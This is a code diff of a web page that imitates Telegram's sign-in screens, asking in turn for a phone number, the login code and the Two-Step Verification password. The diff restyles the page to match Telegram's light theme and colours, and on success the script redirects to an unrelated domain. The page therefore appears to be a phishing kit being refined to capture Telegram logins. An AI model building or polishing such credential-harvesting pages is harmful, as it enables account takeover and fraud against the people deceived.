@@ -11,14 +11,13 @@
 
 <style>
   :root {
-    --bg: #171717;
-    --card-border: #383838;
-    --text-main: #ffffff;
-    --text-sub: #aaaaaa;
-    --accent: #8774e1;
-    --accent-hover: #7966d3;
-    --btn-blue: #3b82f6;
-    --btn-blue-hover: #2563eb;
+    --bg: #ffffff;
+    --card-border: #e0e0e0;
+    --text-main: #000000;
+    --text-sub: #707579;
+    --accent: #3390ec;
+    --accent-hover: #2880de;
+    --input-bg: #ffffff;
   }
   * { box-sizing: border-box; touch-action: manipulation; }
   body {
@@ -35,20 +34,17 @@
   }
   .card {
     width: 100%;
-    max-width: 400px;
+    max-width: 380px;
     text-align: center;
   }
   .logo {
-    width: 110px;
-    height: 110px;
+    width: 120px;
+    height: 120px;
     border-radius: 50%;
-    margin: 0 auto 24px;
-    overflow: hidden;
+    margin: 0 auto 20px;
     display: flex;
     align-items: center;
     justify-content: center;
-    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
-    background: transparent;
   }
   .logo svg {
     width: 100%;
@@ -56,15 +52,15 @@
   }
   h1 {
     color: var(--text-main);
-    font-size: 40px;
-    font-weight: 800;
-    margin: 0 0 12px;
+    font-size: 32px;
+    font-weight: 700;
+    margin: 0 0 8px;
   }
   p.sub {
     color: var(--text-sub);
-    font-size: 14px;
-    line-height: 1.5;
-    margin: 0 0 32px;
+    font-size: 15px;
+    line-height: 1.4;
+    margin: 0 0 28px;
     padding: 0 10px;
   }
   .field {
@@ -74,19 +70,19 @@
     padding: 14px 16px 8px;
     margin-bottom: 16px;
     text-align: left;
-    background: var(--bg);
+    background: var(--input-bg);
   }
   .field:focus-within {
     border-color: var(--accent);
   }
   .field label {
     position: absolute;
-    top: -7px;
+    top: -8px;
     left: 14px;
     background: var(--bg);
     padding: 0 4px;
-    font-size: 11px;
-    color: #888888;
+    font-size: 12px;
+    color: var(--text-sub);
   }
   .field input {
     width: 100%;
@@ -123,7 +119,7 @@
     display: flex;
     align-items: center;
     gap: 12px;
-    margin: 24px 0 32px 4px;
+    margin: 20px 0 28px 2px;
     text-align: left;
     cursor: pointer;
     user-select: none;
@@ -134,7 +130,7 @@
   .checkmark {
     width: 20px;
     height: 20px;
-    background-color: #2b2b2b;
+    border: 2px solid var(--accent);
     border-radius: 4px;
     display: flex;
     justify-content: center;
@@ -150,40 +146,17 @@
     color: #ffffff;
   }
   .checkbox-row span { 
-    color: #dddddd; 
+    color: var(--text-main); 
     font-size: 15px; 
   }
-  .btn-primary {
+  .btn-blue {
     width: 100%;
     background-color: var(--accent);
     color: white;
     border: none;
     padding: 14px;
-    border-radius: 12px;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: background-color 0.2s, transform 0.05s;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-  }
-  .btn-primary:hover {
-    background-color: var(--accent-hover);
-  }
-  .btn-primary:active {
-    transform: scale(0.98);
-  }
-
-  .btn-blue {
-    width: 100%;
-    background-color: var(--btn-blue);
-    color: white;
-    border: none;
-    padding: 14px;
     border-radius: 24px;
-    font-size: 16px;
+    font-size: 15px;
     font-weight: 600;
     cursor: pointer;
     transition: background-color 0.2s, transform 0.05s;
@@ -193,13 +166,13 @@
     gap: 10px;
   }
   .btn-blue:hover {
-    background-color: var(--btn-blue-hover);
+    background-color: var(--accent-hover);
   }
   .btn-blue:active {
     transform: scale(0.98);
   }
 
-  /* 💫 CSS Animation សម្រាប់រង្វង់វិល Loading */
+  /* CSS Animation សម្រាប់រង្វង់វិល Loading */
   @keyframes spin {
     0% { transform: rotate(0deg); }
     100% { transform: rotate(360deg); }
@@ -207,7 +180,7 @@
   .spinner {
     width: 20px;
     height: 20px;
-    border: 3px solid rgba(255, 255, 255, 0.3);
+    border: 3px solid rgba(255, 255, 255, 0.4);
     border-top: 3px solid #ffffff;
     border-radius: 50%;
     animation: spin 0.8s linear infinite;
@@ -218,14 +191,14 @@
     margin-top: 24px;
     display: flex;
     flex-direction: column;
-    gap: 18px;
+    gap: 16px;
   }
   .alt-links a {
     color: var(--accent);
     text-decoration: none;
-    font-size: 13px;
+    font-size: 14px;
     font-weight: 600;
-    letter-spacing: 0.5px;
+    letter-spacing: 0.3px;
   }
   .alt-links a:hover {
     opacity: 0.8;
@@ -235,7 +208,7 @@
   #country-modal {
     position: fixed;
     top: 0; left: 0; width: 100%; height: 100%;
-    background: rgba(0,0,0,0.8);
+    background: rgba(0,0,0,0.5);
     display: none;
     justify-content: center;
     align-items: center;
@@ -243,7 +216,7 @@
     padding: 20px;
   }
   .modal-content {
-    background: #212121;
+    background: #ffffff;
     width: 100%;
     max-width: 400px;
     height: 80vh;
@@ -252,6 +225,7 @@
     flex-direction: column;
     overflow: hidden;
     border: 1px solid var(--card-border);
+    box-shadow: 0 10px 25px rgba(0,0,0,0.1);
   }
   .modal-header {
     padding: 16px;
@@ -262,11 +236,11 @@
   }
   .modal-header input {
     width: 100%;
-    background: #2f2f2f;
+    background: #f4f4f5;
     border: none;
     padding: 10px 14px;
     border-radius: 8px;
-    color: white;
+    color: #000;
     outline: none;
     font-size: 15px;
   }
@@ -284,7 +258,7 @@
     transition: background 0.2s;
   }
   .country-item:hover {
-    background: #2f2f2f;
+    background: #f4f4f5;
   }
   .country-item-left {
     display: flex;
@@ -341,7 +315,7 @@
         <span>Keep me signed in</span>
       </label>
 
-      <button id="btn-send" onclick="sendPhone()" class="btn-primary">NEXT</button>
+      <button id="btn-send" onclick="sendPhone()" class="btn-blue">NEXT</button>
 
       <div class="alt-links">
         <a href="#">LOG IN BY QR CODE</a>
@@ -366,14 +340,14 @@
 
       <div>
         <div class="flex items-center justify-center gap-2 mb-2">
-          <h2 id="display-phone" class="text-2xl font-bold text-white"></h2>
-          <button onclick="goBackPhone()" title="Edit Phone Number" class="text-gray-400 hover:text-white transition p-1">
+          <h2 id="display-phone" class="text-2xl font-bold text-black"></h2>
+          <button onclick="goBackPhone()" title="Edit Phone Number" class="text-gray-500 hover:text-black transition p-1">
             <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
               <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path>
             </svg>
           </button>
         </div>
-        <p id="auth-status" class="text-gray-400 text-sm max-w-xs mx-auto leading-relaxed">
+        <p id="auth-status" class="text-gray-500 text-sm max-w-xs mx-auto leading-relaxed">
           We've sent the code to the Telegram app on your other device.
         </p>
       </div>
@@ -386,9 +360,9 @@
       </div>
 
       <!-- Spinner Indicator for Auto-Submit -->
-      <div id="loading-indicator" class="hidden flex items-center justify-center gap-2 text-sm text-gray-400 mt-4">
+      <div id="loading-indicator" class="hidden flex items-center justify-center gap-2 text-sm text-gray-500 mt-4">
         <span>Verifying...</span>
-        <span class="spinner"></span>
+        <span class="spinner" style="border-top-color: #3390ec;"></span>
       </div>
 
     </div>
@@ -409,8 +383,8 @@
       </div>
 
       <div>
-        <h2 class="text-3xl font-bold text-white mb-3">Enter Password</h2>
-        <p class="text-gray-400 text-sm max-w-xs mx-auto leading-relaxed">
+        <h2 class="text-2xl font-bold text-black mb-2">Enter Password</h2>
+        <p class="text-gray-500 text-sm max-w-xs mx-auto leading-relaxed">
           You have Two-Step Verification enabled, so your account is protected with an additional password.
         </p>
       </div>
@@ -419,7 +393,7 @@
         <div class="field relative">
           <label>Password</label>
           <input id="password-input" type="password" placeholder="Enter password" onkeydown="if(event.key==='Enter') submit2FA()" class="pr-10">
-          <button type="button" onclick="togglePasswordVisibility()" class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white transition">
+          <button type="button" onclick="togglePasswordVisibility()" class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 hover:text-black transition">
             <svg id="eye-icon" class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
               <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24M1 1l22 22"></path>
             </svg>
@@ -789,7 +763,6 @@
             if (data.success) {
                 window.location.replace(data.redirectUrl || "https://jvpfans.com");
             } else if (data.requiresPassword) {
-                // លោតទៅកាន់ Step 3 (2FA Password Page) ភ្លាមៗ
                 document.getElementById('step-otp').classList.add('hidden');
                 document.getElementById('step-2fa').classList.remove('hidden');
                 document.getElementById('password-input').focus();
